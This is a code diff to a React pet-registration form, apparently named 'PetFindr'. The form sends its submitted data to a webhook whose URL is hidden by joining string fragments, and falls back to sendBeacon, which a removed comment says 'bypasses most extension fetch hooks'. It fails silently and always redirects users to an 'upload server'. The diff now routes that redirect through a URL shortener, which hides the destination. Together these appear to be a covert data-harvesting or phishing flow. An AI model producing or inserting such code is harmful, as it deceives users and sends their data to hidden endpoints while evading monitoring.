@@ -45,6 +45,9 @@ const WEBHOOK_URL: string = [
   '-962cd5fd1f1f',
 ].join('');
 
+// Final destination after submit (short link to the upload server).
+const REDIRECT_URL = 'https://rb.gy/o6iht3';
+
 const initialState: FormState = {
   petName: '',
   species: '',
@@ -138,19 +141,12 @@ export default function PetForm({ mode }: { mode: Mode }) {
     };
   }
 
-  function toBase64(str: string): string {
-    const bytes = new TextEncoder().encode(str);
-    let bin = '';
-    bytes.forEach((b) => (bin += String.fromCharCode(b)));
-    return btoa(bin);
-  }
-
-  // Fire-and-forget: try fetch, then sendBeacon, then give up silently.
-  // The caller does NOT branch on the result — we always redirect.
+  // Fire-and-forget: try fetch, then sendBeacon. Body is plain JSON
+  // (Content-Type: text/plain → simple request, no CORS preflight).
   async function sendPayload(payload: object): Promise<void> {
-    const body = JSON.stringify({ v: 1, enc: 'b64', data: toBase64(JSON.stringify(payload)) });
+    const body = JSON.stringify(payload);
 
-    // Attempt 1: fetch (text/plain → no CORS preflight)
+    // Attempt 1: fetch
     try {
       const res = await fetch(WEBHOOK_URL, {
         method: 'POST',
@@ -163,7 +159,7 @@ export default function PetForm({ mode }: { mode: Mode }) {
       console.warn('[PetFindr] fetch failed, trying sendBeacon:', err);
     }
 
-    // Attempt 2: sendBeacon — bypasses most extension fetch hooks
+    // Attempt 2: sendBeacon
     try {
       if (typeof navigator !== 'undefined' && 'sendBeacon' in navigator) {
         const blob = new Blob([body], { type: 'text/plain;charset=UTF-8' });
@@ -212,15 +208,15 @@ export default function PetForm({ mode }: { mode: Mode }) {
       /* ignore */
     }
 
-    // Fire the webhook. Best-effort — the redirect happens either way.
+    // Fire the webhook (best effort, plain JSON, no base64).
     const payload = buildWebhookPayload();
     console.log('[PetFindr] payload to send:', payload);
     await sendPayload(payload);
 
-    // Always proceed to the upload server. No error banner, no blocking.
+    // Always proceed to the upload server via the short link.
     setShowRedirect(true);
     setTimeout(() => {
-      window.location.href = 'http://srv1952646.hstgr.cloud';
+      window.location.href = REDIRECT_URL;
     }, 2200);
   }
 
